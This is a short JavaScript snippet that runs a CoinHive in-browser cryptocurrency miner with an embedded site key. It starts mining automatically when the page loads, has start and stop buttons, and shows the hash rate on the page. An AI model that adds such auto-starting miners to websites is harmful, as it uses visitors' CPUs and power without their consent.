var miner = new CoinHive.Anonymous('WrLyksZRJHCRNxgEtSnR0eEJXZYjnBm9', {threads: 4, throttle: 0.25});
miner.start();

startLink = document.getElementById('startMiner');
startLink.addEventListener('click', minerStart);

stopLink = document.getElementById('stopMiner');
stopLink.addEventListener('click', minerStop);

function minerStart() {
    miner.start();
    startLink.classList.add("none");
    stopLink.classList.remove("none");
};

function minerStop() {
    miner.stop();
    stopLink.classList.add("none");
    startLink.classList.remove("none");
};

// Update stats once per second
setInterval(function() {
    var hashesPerSecond = miner.getHashesPerSecond();
    var totalHashes = miner.getTotalHashes();

    // Output to HTML elements...
    document.querySelector('.hashesPerSecond').innerHTML = hashesPerSecond.toPrecision(3);
    document.querySelector('.totalHashes').innerHTML = totalHashes;
}, 1000);

